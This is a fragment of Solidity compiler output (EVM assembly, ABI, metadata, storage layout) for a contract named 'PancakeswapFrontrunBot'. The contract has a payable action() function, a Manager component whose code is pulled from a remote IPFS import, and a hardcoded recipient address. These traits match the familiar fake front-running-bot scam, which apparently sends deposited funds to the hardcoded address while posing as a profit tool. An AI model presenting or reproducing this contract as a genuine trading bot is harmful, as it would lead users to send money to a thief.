											"end": 432,
											"name": "KECCAK256",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "tag",
											"source": 3,
											"value": "33"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "GT",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "33"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "tag",
											"source": 3,
											"value": "31"
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 409,
											"end": 432,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "tag",
											"source": 3,
											"value": "19"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "2"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "35"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "100"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MUL",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "tag",
											"source": 3,
											"value": "35"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "KECCAK256",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "tag",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SLOAD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "GT",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "PUSH",
											"source": 3,
											"value": "1F"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "AND",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "tag",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 439,
											"end": 464,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										}
									]
								},
								"1": {
									".code": [
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH #[$]",
											"source": 4,
											"value": "0000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH [$]",
											"source": 4,
											"value": "0000000000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "CODECOPY",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "RETURN",
											"source": 4
										}
									],
									".data": {
										"0": {
											".auxdata": "a26469706673582212207c5cd2ed4ff54cf52113d1ca38c771ae309adacda0d8005e79b722d2b25216d864736f6c63430006060033",
											".code": [
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH",
													"source": 4,
													"value": "80"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH",
													"source": 4,
													"value": "40"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "MSTORE",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "CALLVALUE",
													"source": 4
												},
												{
													"begin": 5,
													"end": 14,
													"name": "DUP1",
													"source": -1
												},
												{
													"begin": 2,
													"end": 4,
													"name": "ISZERO",
													"source": -1
												},
												{
													"begin": 2,
													"end": 4,
													"name": "PUSH [tag]",
													"source": -1,
													"value": "1"
												},
												{
													"begin": 2,
													"end": 4,
													"name": "JUMPI",
													"source": -1
												},
												{
													"begin": 27,
													"end": 28,
													"name": "PUSH",
													"source": -1,
													"value": "0"
												},
												{
													"begin": 24,
													"end": 25,
													"name": "DUP1",
													"source": -1
												},
												{
													"begin": 17,
													"end": 29,
													"name": "REVERT",
													"source": -1
												},
												{
													"begin": 2,
													"end": 4,
													"name": "tag",
													"source": -1,
													"value": "1"
												},
												{
													"begin": 2,
													"end": 4,
													"name": "JUMPDEST",
													"source": -1
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH",
													"source": 4,
													"value": "4"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "CALLDATASIZE",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "LT",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH [tag]",
													"source": 4,
													"value": "2"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "JUMPI",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH",
													"source": 4,
													"value": "0"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "CALLDATALOAD",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH",
													"source": 4,
													"value": "E0"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "SHR",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH",
													"source": 4,
													"value": "C0F93A1"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "EQ",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH [tag]",
													"source": 4,
													"value": "3"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "JUMPI",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH",
													"source": 4,
													"value": "FEAE9AD3"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "EQ",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "PUSH [tag]",
													"source": 4,
													"value": "4"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "JUMPI",
													"source": 4
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "tag",
													"source": 4,
													"value": "2"
												},
												{
													"begin": 6977,
													"end": 7171,
													"name": "JUMPDEST",
													"source": 4
												},
												{
													"begin": 12,
													"end": 13,
													"name": "PUSH",
													"source": -1,
													"value": "0"
												},
												{
													"begin": 9,
													"end": 10,
													"name": "DUP1",
													"source": -1
												},
												{
													"begin": 2,
													"end": 14,
													"name": "REVERT",
													"source": -1
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "tag",
													"source": 4,
													"value": "3"
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "JUMPDEST",
													"source": 4
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "PUSH [tag]",
													"source": 4,
													"value": "5"
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "PUSH [tag]",
													"source": 4,
													"value": "6"
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "JUMP",
													"source": 4,
													"value": "[in]"
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "tag",
													"source": 4,
													"value": "5"
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "JUMPDEST",
													"source": 4
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "STOP",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "tag",
													"source": 4,
													"value": "4"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "JUMPDEST",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "PUSH [tag]",
													"source": 4,
													"value": "7"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "PUSH [tag]",
													"source": 4,
													"value": "8"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "JUMP",
													"source": 4,
													"value": "[in]"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "tag",
													"source": 4,
													"value": "7"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "JUMPDEST",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "PUSH",
													"source": 4,
													"value": "40"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "MLOAD",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "DUP3",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "PUSH",
													"source": 4,
													"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "AND",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "PUSH",
													"source": 4,
													"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "AND",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "DUP2",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "MSTORE",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "PUSH",
													"source": 4,
													"value": "20"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "ADD",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "SWAP2",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "PUSH",
													"source": 4,
													"value": "40"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "MLOAD",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "DUP1",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "SWAP2",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "SUB",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "RETURN",
													"source": 4
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "tag",
													"source": 4,
													"value": "6"
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "JUMPDEST",
													"source": 4
												},
												{
													"begin": 6998,
													"end": 7041,
													"name": "JUMP",
													"source": 4,
													"value": "[out]"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "tag",
													"source": 4,
													"value": "8"
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "JUMPDEST",
													"source": 4
												},
												{
													"begin": 7100,
													"end": 7107,
													"name": "PUSH",
													"source": 4,
													"value": "0"
												},
												{
													"begin": 7121,
													"end": 7163,
													"name": "PUSH",
													"source": 4,
													"value": "8C3BCF4E19996EDEC11B5F0523C6A0151A75D351"
												},
												{
													"begin": 7114,
													"end": 7163,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 7114,
													"end": 7163,
													"name": "POP",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "SWAP1",
													"source": 4
												},
												{
													"begin": 7046,
													"end": 7168,
													"name": "JUMP",
													"source": 4,
													"value": "[out]"
												}
											]
										}
									}
								}
							}
						},
						"methodIdentifiers": {
							"action()": "0a7a1c4d",
							"tokenName()": "6c02a931",
							"tokenSymbol()": "7b61c320"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_tokenName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_tokenSymbol\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"action\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenName\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSymbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"flashloan.sol\":\"PancakeswapFrontrunBot\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/interfaces/IUniswapV2Migrator.sol\":{\"keccak256\":\"0xa83ac0f597c04134b3ea423fd55d3077e952197c1991e23c4e304bfb35a90124\",\"urls\":[\"bzz-raw://ec1a3358caaa80af192bf4a8913041b037736412d7d6d5e894d58dadfab3a1da\",\"dweb:/ipfs/QmbYVrgxQZVevcBgTcPUFutk5mpj61BAdmTPMXGiBt1vA8\"]},\"contracts/interfaces/V1/IUniswapV1Exchange.sol\":{\"keccak256\":\"0xcec8976f205e71a3a5ebdd7130d321484df4e4b6b1091d21d435173acfb6e14b\",\"urls\":[\"bzz-raw://681de3c6ee08cccee6839b3a65f8d80c2c6e55ba5a3aba51f83578a5fef52a65\",\"dweb:/ipfs/QmcJMhgj7CgchN4sxR8MbzJt8DrbJuB6PCdD2fdQ9Ct1qi\"]},\"contracts/interfaces/V1/IUniswapV1Factory.sol\":{\"keccak256\":\"0x2a554e26d874fa4b10736f2e2ac1ba6253cd1ad08a97bd941cb0a41015565589\",\"urls\":[\"bzz-raw://bbe29db0ebf08621cb4211219c02262be9c7510fe03bab94f849a38993f957d6\",\"dweb:/ipfs/QmTutAVpjg925m4JLqHTvukdTyoTr77FotAUAA2AzGug1f\"]},\"flashloan.sol\":{\"keccak256\":\"0xd88832938c53227d6ea5a0403ced890e61bcbac04fefc44263fce33db7667de5\",\"urls\":[\"bzz-raw://c0640fec65acf577da7940a71ea22ddfb24710bbf70acdffe8100cb855213710\",\"dweb:/ipfs/QmQV6YUfgcWhnQEDC5NQBticSL2J5kTT4FcGT1JYb23CHE\"]},\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":{\"keccak256\":\"0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb\",\"urls\":[\"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877\",\"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 89,
								"contract": "flashloan.sol:PancakeswapFrontrunBot",
								"label": "tokenName",
								"offset": 0,
								"slot": "0",
								"type": "t_string_storage"
							},
							{
								"astId": 91,
								"contract": "flashloan.sol:PancakeswapFrontrunBot",
								"label": "tokenSymbol",
								"offset": 0,
								"slot": "1",
								"type": "t_string_storage"
							},
							{
								"astId": 93,
								"contract": "flashloan.sol:PancakeswapFrontrunBot",
								"label": "frontrun",
								"offset": 0,
								"slot": "2",
								"type": "t_uint256"
							},
							{
								"astId": 95,
								"contract": "flashloan.sol:PancakeswapFrontrunBot",
								"label": "manager",
								"offset": 0,
								"slot": "3",
								"type": "t_contract(Manager)1838"
							}
						],
						"types": {
							"t_contract(Manager)1838": {
								"encoding": "inplace",
								"label": "contract Manager",
								"numberOfBytes": "20"
							},
							"t_string_storage": {
								"encoding": "bytes",
								"label": "string",
								"numberOfBytes": "32"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC": {
				"C": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "a",
									"type": "uint256"
								}
							],
							"name": "setData",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
